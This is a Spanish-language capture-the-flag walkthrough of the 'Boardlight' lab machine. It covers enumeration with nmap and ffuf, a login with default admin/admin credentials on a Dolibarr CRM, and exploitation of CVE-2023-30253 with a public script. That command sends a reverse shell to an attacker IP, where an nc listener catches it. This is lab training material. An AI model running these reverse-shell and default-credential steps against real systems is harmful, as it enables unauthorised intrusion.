Maquina: Boardlight

Autor:

Dificultad: Facil

Iniciamos la máquina y verificamos la conexión

ping 10.129.135.122 -c 1

Enumeramos la maquina con nmap 

nmap -sV 10.129.135.122

En la web muestra 'Bienvenido a BOARDLIGHT' mantenida por Board.htb.

Abrimos el enlace y usamos Ffuf.

ffuf -w /usr/share/wordlists/dirb/big.txt -H "Host:FUZZ.board.htb" -u "http://board.htb/"

Encontramos el archivo index.php por lo que realizamos la búsqueda.

http://crm.board.htb/index.php

Es un panel de login por lo que probamos las credenciales más comunes. Probamos admin tanto para contraseña y usuario y nos deja iniciar sesión correctamente.

Revisamos la versión por Internet si tiene alguna vulnerabilidad. Efectivamente tiene una vulnerabilidad que intentaremos explotar haciendo una Reverse Shell.

"Copiemos esta versión y busquemos el exploit en Google, y encontrarás un exploit CVE-2023–30253.

https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253

Ejecutamos el script mientras nos ponemos en escucha para conectarnos.

python3 exploit.py http://crm.board.htb admin admin 10.10.14.101 4444

nc -lvnp 4444

En esta etapa, tras obtener la shell en la máquina objetivo, descubrimos que el flag no se encuentra en esta máquina en particular. En cambio, el objetivo ahora es buscar las credenciales del otro usuario en esta misma máquina que indagando por documentaciones de Dolibarr se llama Larissa.

